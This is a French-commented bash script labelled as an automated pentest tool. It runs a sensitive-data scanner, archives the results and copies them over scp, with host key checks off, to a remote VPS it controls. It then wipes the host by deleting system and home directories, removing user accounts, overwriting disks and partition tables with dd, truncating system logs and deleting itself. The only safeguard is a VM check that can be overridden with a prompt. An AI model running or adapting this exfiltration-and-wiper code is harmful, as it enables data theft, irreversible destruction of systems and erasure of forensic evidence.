#!/usr/bin/bash

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_DIR="/tmp/datas_finder"
LOG_FILE="$LOG_DIR/main_$TIMESTAMP.log"


log() {
    local level="${2:-INFO}"
    local color=""
    case "$level" in
        "ERROR") color="\033[31m" ;;  
        "WARN")  color="\033[33m" ;;  
        "OK")    color="\033[32m" ;;  
        "INFO")  color="\033[36m" ;;  
        *)       color="\033[0m"  ;;  
    esac
    echo -e "${color}[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $*\033[0m" | tee -a "$LOG_FILE"
}

section() {
    echo ""
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║  $*"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo ""
}

connect_to_vps() {
    section "VPS CONNECTION"
    
    if [[ -z "${VPS_IP:-}" ]] || [[ -z "${VPS_USER:-}" ]] || [[ -z "${VPS_PORT:-}" ]]; then
        log "Paramètres VPS manquants !" "ERROR"
        echo ""
        echo "Veuillez configurer les variables suivantes :"
        echo "  export VPS_IP=123.123.123.123"
        echo "  export VPS_USER=root"
        echo "  export VPS_PORT=22"
        echo "  export VPS_PATH=/root/pentest_datas"
        return 1
    fi
    
    log "Tentative de connexion à $VPS_USER@$VPS_IP:$VPS_PORT" "INFO"
    
    # Test de connexion avec retry
    local max_retries=5
    local retry=0
    
    while [[ $retry -lt $max_retries ]]; do
        if ssh -o ConnectTimeout=5 \
               -o BatchMode=yes \
               -o StrictHostKeyChecking=no \
               -o UserKnownHostsFile=/dev/null \
               -p "$VPS_PORT" "$VPS_USER@$VPS_IP" "exit" 2>/dev/null; then
            
            log "✅ Connexion VPS établie avec succès" "OK"
            
            # Créer le dossier sur le VPS
            ssh -p "$VPS_PORT" "$VPS_USER@$VPS_IP" "mkdir -p ${VPS_PATH:-/root/pentest_datas}" 2>/dev/null
            
            return 0
        fi
        
        retry=$((retry + 1))
        log "Tentative $retry/$max_retries échouée, nouvelle tentative dans 2s..." "WARN"
        sleep 2
    done
    
    log "❌ Échec de connexion au VPS après $max_retries tentatives" "ERROR"
    return 1
}

# ============================================
# 2. SCAN PYTHON
# ============================================

run_python_scanner() {
    section "🔍 SCAN DES DONNÉES SENSIBLES"
    
    log "Démarrage du scanner Python..." "INFO"
    
    # Vérifier les fichiers Python
    if [[ ! -f "$SCRIPT_DIR/datas_finder.py" ]]; then
        log "datas_finder.py introuvable !" "ERROR"
        return 1
    fi
    
    if [[ ! -f "$SCRIPT_DIR/config.py" ]]; then
        log "config.py introuvable !" "ERROR"
        return 1
    fi
    
    cd "$SCRIPT_DIR"
    python3 datas_finder.py 2>&1 | tee -a "$LOG_FILE"
    local exit_code=${PIPESTATUS[0]}
    
    if [[ $exit_code -ne 0 ]]; then
        log "❌ Scanner Python échoué (code: $exit_code)" "ERROR"
        return 1
    fi
    
    log "✅ Scanner Python terminé avec succès" "OK"
    
    local data_dir=$(find /tmp/datas_finder -type d -name "20*" 2>/dev/null | sort -r | head -1)
    
    if [[ -n "$data_dir" ]]; then
        log "📁 Dossier de données: $data_dir" "INFO"
        echo "$data_dir" > /tmp/last_data_dir.txt
        return 0
    else
        log "❌ Aucun dossier de données trouvé dans /tmp/datas_finder" "ERROR"
        return 1
    fi
}


send_data_to_vps() {
    section "SEND DATAS"
    
    local data_dir=$(cat /tmp/last_data_dir.txt 2>/dev/null || echo "")
    
    if [[ -z "$data_dir" ]] || [[ ! -d "$data_dir" ]]; then
        log "Dossier de données introuvable" "ERROR"
        return 1
    fi
    
    log "Préparation de l'archive..." "INFO"
    
    # Créer une archive
    local archive_name="pentest_datas_$TIMESTAMP.tar.gz"
    local archive_path="/tmp/$archive_name"
    
    tar -czf "$archive_path" -C "$(dirname "$data_dir")" "$(basename "$data_dir")" 2>/dev/null || {
        log "❌ Échec de la création de l'archive" "ERROR"
        return 1
    }
    
    log "✅ Archive créée: $archive_path ($(du -h "$archive_path" | cut -f1))" "OK"
    
    # Envoyer vers le VPS
    log "Transfert vers $VPS_USER@$VPS_IP:$VPS_PATH..." "INFO"
    
    scp -o ConnectTimeout=10 \
        -o StrictHostKeyChecking=no \
        -P "$VPS_PORT" \
        "$archive_path" "$VPS_USER@$VPS_IP:${VPS_PATH:-/root/pentest_datas}/" 2>/dev/null || {
        log "❌ Échec du transfert vers le VPS" "ERROR"
        return 1
    }
    
    log "✅ Transfert terminé avec succès" "OK"
    
    # Vérifier la présence du fichier sur le VPS
    if ssh -p "$VPS_PORT" "$VPS_USER@$VPS_IP" "ls -lh ${VPS_PATH:-/root/pentest_datas}/$archive_name" 2>/dev/null; then
        log "✅ Fichier vérifié sur le VPS" "OK"
    fi
    
    # Nettoyer l'archive locale
    rm -f "$archive_path"
    log "🧹 Archive locale supprimée" "INFO"
    
    return 0
}

# ============================================
# 4. AUTO-DESTRUCTION COMPLÈTE
# ============================================

destroy_system() {
    section "💀 AUTO-DESTRUCTION DU SYSTÈME"
    
    # ⚠️  DERNIER AVERTISSEMENT
    echo ""
    echo "╔════════════════════════════════════════════════════════════════════════╗"
    echo "║  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ⚠️  ║"
    echo "║                                                                        ║"
    echo "║  💀  DESTRUCTION COMPLÈTE DU SYSTÈME EN COURS                         ║"
    echo "║                                                                        ║"
    echo "║  Tous les fichiers de la machine vont être SUPPRIMÉS                   ║"
    echo "║  Cette opération est IRRÉVERSIBLE                                     ║"
    echo "║                                                                        ║"
    echo "║  VPS: $VPS_USER@$VPS_IP                                                           "
    echo "║  Données sauvegardées: ${VPS_PATH:-/root/pentest_datas}                           "
    echo "║                                                                        ║"
    echo "╚════════════════════════════════════════════════════════════════════════╝"
    echo ""
    
    # Dernière tentative de sauvegarde des logs
    log "Dernière sauvegarde des logs vers le VPS..." "WARN"
    
    scp -o ConnectTimeout=5 -o StrictHostKeyChecking=no -P "$VPS_PORT" \
        "$LOG_FILE" "$VPS_USER@$VPS_IP:${VPS_PATH:-/root/pentest_datas}/logs_$TIMESTAMP.log" 2>/dev/null || true
    
    log "🔥 DÉBUT DE LA DESTRUCTION..." "WARN"
    
    # ============================================
    # PHASE 1: Destruction des fichiers système
    # ============================================
    
    # Liste des dossiers à supprimer (du plus au moins critique)
    local dirs_to_delete=(
        "/boot"
        "/bin"
        "/sbin"
        "/lib"
        "/lib64"
        "/etc"
        "/opt"
        "/usr"
        "/var"
        "/home"
        "/root"
    )
    
    for dir in "${dirs_to_delete[@]}"; do
        if [[ -d "$dir" ]]; then
            log "🗑️  Suppression de $dir..." "WARN"
            
            # Désactiver les protections
            if [[ -f /usr/bin/chattr ]]; then
                chattr -R -i "$dir" 2>/dev/null || true
            fi
            
            # Supprimer récursivement
            rm -rf "$dir" 2>/dev/null || true
            
            # Tentative avec sudo si nécessaire
            if command -v sudo &>/dev/null; then
                sudo rm -rf "$dir" 2>/dev/null || true
            fi
        fi
    done
    
    # ============================================
    # PHASE 2: Nettoyage des utilisateurs
    # ============================================
    
    log "🗑️  Suppression des utilisateurs..." "WARN"
    
    # Supprimer tous les utilisateurs (sauf root)
    if [[ -f /etc/passwd ]]; then
        while IFS=: read -r user _; do
            if [[ "$user" != "root" ]] && [[ "$user" != "nobody" ]]; then
                userdel -f "$user" 2>/dev/null || true
                log "  Suppression de l'utilisateur: $user" "WARN"
            fi
        done < /etc/passwd
    fi
    
    # ============================================
    # PHASE 3: Destruction des disques
    # ============================================
    
    log "🗑️  Destruction des données sur les disques..." "WARN"
    
    # Récupérer la liste des disques
    if command -v lsblk &>/dev/null; then
        local disks=$(lsblk -nd -o NAME,TYPE | grep disk | awk '{print $1}')
        
        for disk in $disks; do
            if [[ -e "/dev/$disk" ]]; then
                log "  Effacement sécurisé de /dev/$disk..." "WARN"
                
                # Remplir avec des zéros (rapide)
                dd if=/dev/zero of="/dev/$disk" bs=1M count=100 2>/dev/null || true
                
                # Détruire la table de partition
                dd if=/dev/urandom of="/dev/$disk" bs=512 count=1 2>/dev/null || true
            fi
        done
    fi
    
    # ============================================
    # PHASE 4: Nettoyage final
    # ============================================
    
    log "🗑️  Nettoyage final..." "WARN"
    
    # Supprimer les fichiers temporaires
    rm -rf /tmp/* 2>/dev/null || true
    rm -rf /var/tmp/* 2>/dev/null || true
    
    # Vider les logs système
    find /var/log -type f -exec truncate -s 0 {} \; 2>/dev/null || true
    
    # ============================================
    # PHASE 5: AUTO-DESTRUCTION DU SCRIPT
    # ============================================
    
    log "💀 Le système est détruit. Fin de l'exécution." "WARN"
    
    # Tenter de supprimer ce script
    rm -f "$0" 2>/dev/null || true
    
    # Dernier message (si possible)
    echo ""
    echo "╔════════════════════════════════════════════════════════════════════════╗"
    echo "║  💀  SYSTÈME DÉTRUIT AVEC SUCCÈS                                      ║"
    echo "║                                                                        ║"
    echo "║  Données sauvegardées sur: $VPS_USER@$VPS_IP:${VPS_PATH:-/root/pentest_datas}"
    echo "║                                                                        ║"
    echo "║  Fin de l'opération. Au revoir. 👋                                    ║"
    echo "╚════════════════════════════════════════════════════════════════════════╝"
    
    # Forcer la sortie immédiate
    exit 0
}

# ============================================
# FONCTION PRINCIPALE
# ============================================

main() {
    # Bannière
    echo ""
    echo "╔════════════════════════════════════════════════════════════════════════╗"
    echo "║  🔥  PENTEST AUTO - Version 1.0                                       ║"
    echo "║  ⚠️  AUTO-DESTRUCTION ACTIVÉE                                         ║"
    echo "║  📍  $(hostname) - $(date)                                           ║"
    echo "╚════════════════════════════════════════════════════════════════════════╝"
    
    # Vérifier qu'on est sur une VM
    if ! systemd-detect-virt --vm >/dev/null 2>&1 && \
       ! grep -q "VirtualBox\|VMware\|KVM" /sys/class/dmi/id/product_name 2>/dev/null; then
        log "⚠️  ATTENTION: Non détecté comme VM !" "WARN"
        echo ""
        echo "Ce script doit être exécuté sur une VM de test."
        echo "Voulez-vous continuer ? (O/N)"
        read -r response
        if [[ "$response" != "O" ]] && [[ "$response" != "o" ]]; then
            log "Annulation par l'utilisateur" "INFO"
            exit 1
        fi
    fi
    
    # Démarrer le logging
    mkdir -p "$LOG_DIR"
    log "Démarrage du pentest automatisé" "INFO"
    
    # 1. Connexion au VPS
    if ! connect_to_vps; then
        log "❌ Échec de connexion au VPS - Arrêt" "ERROR"
        exit 1
    fi
    
    # 2. Exécution du scanner Python
    if ! run_python_scanner; then
        log "❌ Échec du scan - Arrêt" "ERROR"
        exit 1
    fi
    
    # 3. Envoi des données vers le VPS
    if ! send_data_to_vps; then
        log "❌ Échec de l'envoi des données - Arrêt" "ERROR"
        exit 1
    fi
    
    # 4. Auto-destruction
    log "✅ Toutes les opérations réussies. Destruction du système..." "OK"
    sleep 2
    
    destroy_system
}

# ============================================
# EXÉCUTION
# ============================================

# Vérifier les paramètres requis
if [[ -z "${VPS_IP:-}" ]] || [[ -z "${VPS_USER:-}" ]] || [[ -z "${VPS_PORT:-}" ]]; then
    echo ""
    echo "╔════════════════════════════════════════════════════════════════════════╗"
    echo "║  ❌  PARAMÈTRES VPS MANQUANTS                                           ║"
    echo "╚════════════════════════════════════════════════════════════════════════╝"
    echo ""
    echo "Ce script nécessite la configuration des variables VPS."
    echo ""
    echo "Exemple d'utilisation :"
    echo ""
    echo "  export VPS_IP=123.123.123.123"
    echo "  export VPS_USER=root"
    echo "  export VPS_PORT=22"
    echo "  export VPS_PATH=/root/pentest_datas  # Optionnel"
    echo ""
    echo "  ./main.sh"
    echo ""
    exit 1
fi

# Exécution principale
main "$@"